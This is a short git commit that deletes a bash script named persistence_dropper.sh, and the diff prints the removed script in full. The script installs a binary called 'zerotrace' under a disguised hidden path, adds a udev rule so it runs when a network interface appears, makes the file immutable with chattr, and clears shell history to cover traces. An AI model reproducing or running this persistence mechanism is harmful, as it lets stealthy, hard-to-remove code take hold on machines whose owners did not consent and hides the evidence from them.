3cd614ec3b85400172b8c32143b29df96d5780da
C4rbn <mokshanbasuru@gmail.com>
2026-04-30 07:40:54 +0530

    Delete persistence_dropper.sh

--- persistence_dropper.sh
+++
@@ -1,8 +0,0 @@
-#!/bin/bash
-B="./target/release/zerotrace"
-D="/usr/local/bin/.sys_vfs_cache"
-cp $B $D
-chmod +x $D
-echo 'SUBSYSTEM=="net", ACTION=="add", KERNEL=="eth*", RUN+="'$D'"' > /etc/udev/rules.d/10-local.rules
-chattr +i $D
-history -c
